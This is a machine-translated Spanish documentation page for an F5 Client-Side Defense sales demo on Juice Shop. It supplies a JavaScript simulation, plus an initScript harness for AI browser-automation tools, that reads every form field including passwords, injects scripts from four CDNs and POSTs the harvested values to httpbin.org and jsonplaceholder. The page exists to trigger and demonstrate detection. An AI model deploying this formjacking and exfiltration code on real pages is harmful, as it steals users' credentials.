@@ -1,0 +1,233 @@
+---
+title: Detección de activación
+description: >-
+  Activadores de detección de ataques, ajuste de umbrales y validación de
+  señales
+sidebar:
+  order: 6
+  label: Detección de activación
+i18n:
+  sourceHash: 3c5915b65966
+  translator: machine
+---
+
+import { Aside, Code, Steps } from "@astrojs/starlight/components";
+import Screenshot from "@f5xc-salesdemos/docs-theme/components/Screenshot.astro";
+
+export const combinedScript = `// CSD Demo — Combined Detection Script
+// Triggers ALL CSD detection signals: field reads, script injection, exfiltration
+(function() {
+    console.log('='.repeat(50));
+    console.log('[CSD Demo] Combined Detection Script — Starting');
+    console.log('='.repeat(50));
+
+    // Phase 1: Harvest all form fields (CSD tracks field reads on page-load DOM fields)
+    console.log('\\n[Formjack] Phase 1: Form field harvesting');
+    var inputs = document.querySelectorAll('input');
+    var harvested = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+    });
+    console.log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+    // Phase 2: Inject third-party scripts from 4 CDN domains
+    console.log('\\n[Supply Chain] Phase 2: Multi-CDN script injection');
+    var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+    ];
+    cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.onload = function() {
+            console.log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url);
+        };
+        script.onerror = function() {
+            console.log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url);
+        };
+        document.head.appendChild(script);
+        console.log('[Supply Chain] Injected script tag: ' + cdn.name);
+    });
+
+    // Phase 3: Exfiltrate harvested data to external endpoints
+    console.log('\\n[Exfil] Phase 3: Data exfiltration');
+    var payload = JSON.stringify({
+        type: 'combined_demo',
+        credentials: harvested,
+        page: window.location.href,
+        timestamp: Date.now()
+    });
+
+    fetch('https://www.httpbin.org/post', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    }).then(function() {
+        console.log('[Exfil] Data sent to www.httpbin.org');
+    });
+
+    fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload
+    }).then(function() {
+        console.log('[Exfil] Data sent to jsonplaceholder.typicode.com');
+    });
+
+    // Summary
+    console.log('\\n' + '='.repeat(50));
+    console.log('[CSD Demo] Simulation complete');
+    console.log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+    console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (4 CDN domains)');
+    console.log('[CSD Demo] Exfil channels: 2 (fetch POST)');
+    console.log('[CSD Demo] Detection takes 5-10 minutes to appear in the CSD console.');
+    console.log('='.repeat(50));
+})();`;
+
+## Activar la detección
+
+CSD monitoriza el comportamiento de JavaScript dentro del navegador. A diferencia de WAF o Bot Defense, no se puede activar la detección de CSD con comandos curl — requiere actividad real de scripts en el lado del navegador. El siguiente script combinado activa las tres señales de detección de CSD en una sola ejecución: recolección de campos de formulario, inyección de scripts de terceros desde múltiples dominios CDN y exfiltración de datos hacia endpoints externos.
+
+### Ejecutar el script de simulación combinado
+
+<Steps>
+1. Navegue a la **página de inicio de sesión** de Juice Shop en `https://botdemo.sales-demo.f5demos.com/#/login`
+
+2. Ingrese credenciales ficticias en los campos del formulario — escriba `test@example.com` en el campo **Email** y `P@ssword123` en el campo **Password** (no envíe el formulario)
+
+3. Abra DevTools (**F12** &rarr; pestaña **Console**)
+
+   <Screenshot light="/images/devtools-console-light.png" dark="/images/devtools-console-dark.png" alt="Consola de DevTools vacía lista para entrada de scripts" />
+
+4. Pegue el siguiente script en la consola y presione **Enter** — se ejecuta automáticamente como una función autoejecutable
+
+   <Code code={combinedScript} lang="js" title="Combined Detection Script" />
+
+5. Observe la salida por fases `[CSD Demo]` en la consola confirmando cada paso: recolección de campos, inyección de scripts desde 4 dominios CDN y exfiltración de datos. `esm.sh` sirve sintaxis de módulo ES (`export default …`) — cuando se carga como una etiqueta `<script>` clásica, esto causa `Uncaught SyntaxError: Cannot use import statement outside a module`. Esto es esperado y no afecta la detección de CSD (la etiqueta script se inyecta igualmente y la solicitud de red se realiza)
+
+   <Screenshot light="/images/devtools-console-output-light.png" dark="/images/devtools-console-output-dark.png" alt="Salida de consola después de ejecutar el script de simulación" />
+</Steps>
+
+### Ejecución automatizada con IA
+
+Los asistentes de IA con herramientas de automatización de navegador (MCP Chrome DevTools, Playwright, Puppeteer) ejecutan la simulación programáticamente en lugar de seguir los pasos manuales anteriores:
+
+1. **Navegar con initScript** — primero navegue a `about:blank` para asegurar un contexto de documento limpio, luego `navigate_page` a la URL de la página de inicio de sesión (por ejemplo, `http://$F5XC_DOMAINNAME/#/login`) con un `initScript` que guarde las referencias nativas de `setInterval`, `clearInterval`, `fetch` y `console.log` antes de que zone.js las modifique, haga polling para los campos del formulario de inicio de sesión, rellene las credenciales mediante el setter nativo `HTMLInputElement.prototype.value`, y ejecute inmediatamente el Script de Detección Combinado en línea. Use el initScript literal que se muestra a continuación.
+2. **Cerrar el banner de bienvenida** — `press_key` con `Escape` para cerrar el Banner de Bienvenida. En visitas posteriores, el banner puede no aparecer (cookies persistidas)
+3. **Esperar la finalización** — espere 10 segundos para que todos los callbacks de carga/error de scripts CDN y las resoluciones de promesas fetch se completen
+4. **Capturar evidencia** — `list_console_messages` para verificar `[CSD Demo] Simulation complete`; `list_network_requests` filtrado por tipos `script` y `fetch` para verificar los códigos de estado HTTP
+
+**Harness initScript (literal — envuelve el Script de Detección Combinado para ejecución automatizada):**
+
+```javascript
+// Save native references before zone.js patches them
+var _si = window.setInterval.bind(window);
+var _ci = window.clearInterval.bind(window);
+var _fetch = window.fetch.bind(window);
+var _log = window.console.log.bind(window.console);
+
+// Poll for login form fields, fill credentials, run detection script
+var _poll = _si(function() {
+  var emailEl = document.querySelector('input[type="email"]');
+  var passEl  = document.querySelector('input[type="password"]');
+  if (emailEl && passEl) {
+    _ci(_poll);
+    // Fill credentials via native setter (bypasses zone.js)
+    var nativeSet = Object.getOwnPropertyDescriptor(
+      window.HTMLInputElement.prototype, 'value').set;
+    nativeSet.call(emailEl, 'test@example.com');
+    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
+    nativeSet.call(passEl, 'P@ssword123');
+    passEl.dispatchEvent(new Event('input', { bubbles: true }));
+
+    // Run Combined Detection Script inline using native fetch for exfil
+    (function() {
+      _log('==================================================');
+      _log('[CSD Demo] Combined Detection Script — Starting');
+      _log('==================================================');
+
+      _log('\n[Formjack] Phase 1: Form field harvesting');
+      var inputs = document.querySelectorAll('input');
+      var harvested = {};
+      inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+      });
+      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
+      var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+      ];
+      cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
+        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
+        document.head.appendChild(script);
+        _log('[Supply Chain] Injected script tag: ' + cdn.name);
+      });
+
+      _log('\n[Exfil] Phase 3: Data exfiltration');
+      var payload = JSON.stringify({
+        type: 'combined_demo', credentials: harvested,
+        page: window.location.href, timestamp: Date.now()
+      });
+      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
+        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
+      _fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST', mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' }, body: payload
+      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+
+      _log('\n==================================================');
+      _log('[CSD Demo] Simulation complete');
+      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
+      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
+      _log('==================================================');
+    })();
+  }
+}, 300);
+```
+
+**Nota sobre `fetch` nativo:** Este harness guarda `window.fetch.bind(window)` para evitar errores de zone.js. Este es el comportamiento correcto para todas las fases de simulación de ataques. La mitigación de CSD bloquea la carga de scripts (limpiando los valores `src` de las etiquetas `&lt;script&gt;`), no las llamadas `fetch()`, por lo que guardar la referencia nativa de fetch no afecta el comportamiento de mitigación. El mismo initScript se utiliza para la Fase 2 y la Fase 3.
+
+<Aside type="caution">
+**Incompatibilidad con zone.js** — Juice Shop utiliza zone.js de Angular, que modifica `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest` y otras APIs del navegador. Esto rompe las herramientas MCP `evaluate_script`, `fill` y `click` con `Cannot read properties of undefined (reading 'call')`. Use `navigate_page` con `initScript` en su lugar — `initScript` se ejecuta antes de que zone.js se cargue, por lo que puede guardar las referencias nativas de las APIs. El initScript debe rellenar los campos del formulario usando el setter nativo `HTMLInputElement.prototype.value` (no la herramienta `fill`) y ejecutar el script de detección en línea dentro del callback de `setInterval`.
+</Aside>
+
+<Aside type="note">
+**Acumulación de initScript** — cada llamada a `navigate_page` con un parámetro `initScript` agrega el script a una lista persistente que se ejecuta en cada carga de documento posterior en ese contexto del navegador. Para evitar que scripts obsoletos interfieran, navegue a `about:blank` entre ejecuciones o use `new_page` con `isolatedContext` para un contexto limpio.
+</Aside>
+
+Los operadores sin herramientas de automatización de navegador utilizan los pasos manuales anteriores.
+
+<Aside type="tip">
+La detección tarda **5-10 minutos** en aparecer en el panel de CSD. Si las alertas aún no son visibles después de ejecutar el script, continúe con el [recorrido por la Consola de CSD](/csd/csd-console/) y vuelva a verificar.
+</Aside>
+
+### Qué hace el script
+
+La simulación combinada activa las tres señales de detección de CSD:
+
+| Comportamiento | Qué hace el script | Qué ve CSD |
+| --- | --- | --- |
+| **Recolección de campos** | Lee valores de elementos `input` existentes (email, contraseña) | Scripts leyendo campos de formulario sensibles — marcados como Riesgo Alto |
+| **Inyección de scripts** | Añade 4 etiquetas `<script>` cargando desde `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com` y `ga.jspm.io` | 4 nuevos dominios de scripts de terceros en la página |
+| **Exfiltración de datos** | Envía datos recolectados mediante `fetch` a `www.httpbin.org` y `jsonplaceholder.typicode.com` | Llamadas de red a dominios externos (nota: los destinos de fetch aparecen como interacciones de red de scripts, no en la vista de dominios de Red) |
+
+<Aside type="note">
+CSD tiene límites de detección específicos — por ejemplo, solo se rastrean los campos DOM de carga de página y la vista de Red muestra únicamente los dominios de carga de scripts. Consulte [Límites de detección](/csd/overview/#detection-boundaries) para ver la lista completa.
+</Aside>
+
+### Simulaciones avanzadas
+
+El script combinado anterior es una versión simplificada de 3 fases (recolectar, inyectar, exfiltrar) adecuada para la mayoría de las demostraciones. La [Biblioteca de scripts de ataque](/csd/attack-scripts/) proporciona 10 scripts específicos organizados por tipo de ataque, incluyendo una prueba de estrés de **Detección Máxima** que agrega manipulación del DOM, exfiltración de cookies y canales de beacon de imagen además de la cobertura del script combinado. Use los scripts individuales para demostrar categorías de ataque específicas (formjacking, skimming digital, inyección de cadena de suministro, exfiltración de datos, manipulación del DOM) de forma aislada.
